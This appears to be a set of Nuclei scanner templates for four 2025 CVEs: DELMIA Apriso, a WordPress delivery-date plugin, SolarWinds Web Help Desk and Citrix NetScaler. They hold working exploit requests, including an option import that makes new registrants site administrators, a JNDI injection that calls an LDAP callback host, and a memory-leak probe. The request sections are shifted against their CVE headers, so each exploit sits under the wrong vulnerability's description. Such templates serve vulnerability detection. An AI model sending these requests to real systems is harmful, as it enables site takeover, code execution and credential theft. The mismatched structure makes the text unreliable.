id: CVE-2025-5086
info:
  author: hacktronai,iamnoooob,pdresearch
  classification:
    cve-id: CVE-2025-5086
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9
    cwe-id: CWE-502
    epss-percentile: 0.9753
    epss-score: 0.45734
  description: 'A deserialization of untrusted data vulnerability affecting DELMIA
    Apriso from Release 2020 through Release 2025 could lead to a remote code execution.

    '
  impact: 'Unauthenticated attackers can exploit unsafe deserialization to execute
    arbitrary code on DELMIA Apriso servers, achieving complete system compromise.

    '
  metadata:
    fofa-query: body="/Apriso/Portal"
    max-request: 1
    shodan-query: html:"apriso"
    verified: true
  name: Dassault Systèmes DELMIA Apriso (up to 2025) - Insecure Deserialization
  reference:
  - https://www.hacktron.ai/blog/posts/dassault-delmia-apriso-rce/
  - https://www.3ds.com/vulnerability/advisories
  remediation: 'Upgrade DELMIA Apriso to a version later than Release 2025 that properly
    validates deserialized data.

    '
  severity: critical
  tags: cve,cve2025,delmia,apriso,serialization,rce,kev,vkev,vuln
---
flow: http(1) && http(2) && http(3)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body, 'orddd_import_success')
    - contains(header, 'application/json')
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYq6CV9CqPQBC7dSy


    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy

    Content-Disposition: form-data; name="action"


    orddd_import

    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy

    Content-Disposition: form-data; name="is_drag_drop_request_ajax"


    yes

    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy

    Content-Disposition: form-data; name="orddd-import-file";filename="exp.json"


    a:2:{s:18:"users_can_register";b:1;s:12:"default_role";s:13:"administrator";}

    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy--

    '
- matchers:
  - dsl:
    - contains(body, 'wp-login-register')
    internal: true
    type: dsl
  raw:
  - 'GET /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - negative: true
    part: body
    type: word
    words:
    - wp-login-register
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYq6CV9CqPQBC7dSy


    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy

    Content-Disposition: form-data; name="action"


    orddd_import

    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy

    Content-Disposition: form-data; name="is_drag_drop_request_ajax"


    yes

    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy

    Content-Disposition: form-data; name="orddd-import-file";filename="exp.json"


    a:2:{s:18:"users_can_register";b:0;s:12:"default_role";s:13:"administrator";}

    ------WebKitFormBoundaryYq6CV9CqPQBC7dSy--

    '
  - 'GET /wp-login.php?{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2025-2907
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-2907
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.91659
    epss-score: 0.07604
  description: 'The Order Delivery Date WordPress plugin before 12.3.1 does not have
    authorization and CSRF checks when importing settings. Furthermore it also lacks
    proper checks to only update options relevant to the Order Delivery Date WordPress
    plugin before 12.3.1. This leads to attackers being able to modify the default_user_role
    to administrator and users_can_register, allowing them to register as an administrator
    of the site for complete site takeover.

    '
  impact: 'Unauthenticated attackers can modify WordPress options to enable user registration
    with administrator role, allowing complete site takeover without authentication.

    '
  metadata:
    fofa-query: body="wp-content/plugins/order-delivery-date-for-woocommerce"
    max-request: 4
    verified: true
  name: Order Delivery Date Pro for WooCommerce < 12.3.1 - Arbitrary Option Update
  reference:
  - https://wpscan.com/vulnerability/2e513930-ec01-4dc6-8991-645c5267e14c/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-2907
  remediation: 'Update to version 12.3.1 or later.

    '
  severity: critical
  tags: cve,cve2025,wp,wordpress,wp-plugin,takeover,order-delivery-date,vkev,vuln
---
flow: 'http("initial_session") &&

  http("login_pref_page") &&

  http("trigger_saml_object") &&

  http("create_jsonrpc_bridge") &&

  http("create_malicious_object") &&

  http("trigger_jndi_lookup")

  '
http:
- extractors:
  - group: 1
    internal: true
    name: wosid
    part: header
    regex:
    - '[xX]-[W]ebobjects-[sS]ession-[iI]d: ([a-zA-Z0-9]{22})'
    type: regex
  - group: 1
    internal: true
    name: xsrf_token
    part: header
    regex:
    - 'Set-Cookie: XSRF-TOKEN=([a-z0-9-]{36});'
    type: regex
  headers:
    x-webobjects-recording: 1
  id: initial_session
  matchers:
  - condition: and
    dsl:
    - contains(tolower(all_headers), "x-webobjects-session-id")
    - contains(tolower(all_headers), "xsrf-token")
    - contains(toupper(all_headers), "JSESSIONID")
    internal: true
    type: dsl
  - internal: true
    status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/helpdesk/WebObjects/Helpdesk.woa'
- extractors:
  - group: 1
    internal: true
    name: externalAuthContainer
    part: body
    regex:
    - id="externalAuthContainer" updateUrl="/(helpdesk/WebObjects/Helpdesk.woa/ajax/[0-9]+\.[0-9]+)
    type: regex
  headers:
    X-Xsrf-Token: '{{xsrf_token}}'
  id: login_pref_page
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - externalAuthContainer
    - SAML 2.0
  - internal: true
    status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/helpdesk/WebObjects/Helpdesk.woa/wo/bogus.wo/{{wosid}}/1.0?badparam=/ajax/&wopage=LoginPref'
- body: 0.7.1.3.1.0.0.0.1.1.0=1&_csrf={{xsrf_token}}
  headers:
    X-Xsrf-Token: '{{xsrf_token}}'
  id: trigger_saml_object
  matchers:
  - internal: true
    status:
    - 200
    type: status
  method: POST
  path:
  - '{{BaseURL}}/{{externalAuthContainer}}'
- extractors:
  - group: 1
    internal: true
    name: jsonrpc_endpoint
    part: body
    regex:
    - JSONRpcClient\('/helpdesk/WebObjects/Helpdesk.woa/ajax/([0-9.]+)'\);
    type: regex
  headers:
    X-Xsrf-Token: '{{xsrf_token}}'
  id: create_jsonrpc_bridge
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - JSONRpcClient
  - internal: true
    status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/helpdesk/WebObjects/Helpdesk.woa/wo/bogus.wo/{{wosid}}/1.0?badparam=/ajax/&wopage=LoginPref'
- body: "{\n  \"bypass\":\"java.parentpopupwonoselectionstringdummymdssubmitlinkmdsform__enterkeypressedmdsform__shiftkeypressedmdsform__altkeypressed_csrf\"\
    ,\n  \"id\":1,\n  \"method\":\"wopage.setVariableValueForName\",\n  \"params\"\
    :[\n    \"malicious\",\n    {\n      \"javaClass\":\"org.apache.xalan.lib.sql.JNDIConnectionPool\"\
    ,\n      \"jndiPath\":\"ldap://{{interactsh-url}}/ou=ou,o=o\"\n    }\n  ]\n}\n"
  headers:
    Content-Type: application/json
    X-Xsrf-Token: '{{xsrf_token}}'
  id: create_malicious_object
  matchers:
  - internal: true
    status:
    - 200
    type: status
  method: POST
  path:
  - '{{BaseURL}}/helpdesk/WebObjects/Helpdesk.woa/wo/{{jsonrpc_endpoint}}'
- body: "{\n  \"bypass\":\"java.parentpopupwonoselectionstringdummymdssubmitlinkmdsform__enterkeypressedmdsform__shiftkeypressedmdsform__altkeypressed_csrf\"\
    ,\n  \"id\":1,\n  \"method\":\"wopage.variableValueForName\",\n  \"params\":[\"\
    malicious\"]\n}\n"
  headers:
    Content-Type: application/json
    X-Xsrf-Token: '{{xsrf_token}}'
  id: trigger_jndi_lookup
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/helpdesk/WebObjects/Helpdesk.woa/wo/{{jsonrpc_endpoint}}'
id: CVE-2025-40551
info:
  author: Horizon3.ai
  classification:
    cve-id: CVE-2025-40551
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.9904
    epss-score: 0.79316
  description: 'SolarWinds Web Help Desk before version 2026.1 contains an insecure
    deserialization vulnerability in the jabsorb JSON-RPC library. When chained with
    a CSRF whitelist bypass (CVE-2025-40536), remote unauthenticated attackers can
    exploit JNDI injection via the Apache Xalan JNDIConnectionPool class to achieve
    remote code execution. The bypass involves including "/ajax/" in a query parameter
    to circumvent URI validation, while switching from "/ajax/" to "/wo/" endpoints
    bypasses payload sanitization routines.

    '
  impact: 'Remote attackers can execute arbitrary code on the host machine without
    authentication, potentially leading to full system compromise.

    '
  metadata:
    max-request: 6
    product: web_help_desk
    shodan-query: http.favicon.hash:1895809524
    vendor: solarwinds
    verified: true
  name: SolarWinds Web Help Desk < 2026.1 - Unauthenticated JNDI Injection RCE
  reference:
  - https://horizon3.ai/attack-research/cve-2025-40551-another-solarwinds-web-help-desk-deserialization-issue/
  - https://www.solarwinds.com/trust-center/security-advisories/CVE-2025-40551
  - https://documentation.solarwinds.com/en/success_center/whd/content/release_notes/whd_2026-1_release_notes.htm
  - https://nvd.nist.gov/vuln/detail/CVE-2025-40551
  remediation: 'Update SolarWinds Web Help Desk to version 2026.1 or later.

    '
  severity: critical
  tags: cve,cve2025,solarwinds,webhelpdesk,deserialization,rce,jndi,oast,kev,vkev
---
http:
- extractors:
  - group: 1
    internal: true
    name: iv
    part: body
    regex:
    - <InitialValue>([^<]{10,})</InitialValue>
    type: regex
  matchers:
  - condition: and
    dsl:
    - len(iv) > 0
    - contains(to_lower(header), "application/vnd.citrix.authenticateresponse")
    - '!contains(body, "<InitialValue></InitialValue>")'
    - '!contains(to_string(iv), "false")'
    - '!contains(to_string(iv), "true")'
    - '!regex("^[A-Za-z0-9+/=\\s]+$", iv)'
    type: dsl
  payloads:
    iteration:
    - '{{rand_int(1,5)}}'
  raw:
  - 'POST /p/u/doAuthentication.do HTTP/1.0

    Host: {{Hostname}}

    bleed_attack: {{iteration}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Content-Length: 5


    login


    '
  stop-at-first-match: true
  unsafe: true
id: CVE-2025-5777
info:
  author: watchtowr,DhiyaneshDk,darses
  classification:
    epss-percentile: 0.98955
    epss-score: 0.77555
  description: 'Insufficient input validation leading to memory overread on the NetScaler
    Management Interface NetScaler ADC and NetScaler Gateway

    '
  impact: 'Unauthenticated attackers can trigger memory overread conditions to leak
    sensitive information from NetScaler memory, potentially exposing session tokens
    and credentials similar to CitrixBleed.

    '
  metadata:
    fofa-query:
    - title="NetScaler Gateway"
    - title="NetScaler AAA"
    - icon_hash="-1166125415"
    - icon_hash="-1292923998"
    max-request: 1
    shodan-query:
    - title:"NetScaler Gateway"
    - title:"NetScaler AAA"
    - http.favicon.hash:-1166125415
    - http.favicon.hash:-1292923998
    verified: true
  name: Citrix NetScaler Memory Disclosure - CitrixBleed 2
  reference:
  - https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420
  - https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-5777
  remediation: 'Apply the security patches as described in Citrix support article
    CTX693420 and restrict access to the NetScaler Management Interface.

    '
  severity: critical
  tags: cve,cve2025,netscaler,citrix,exposure,kev,vkev,vuln
---
flow: http(1) && http(2) && http(3) && http(4) && http(5)
http:
- matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - ProcessMessageASync_v2Response
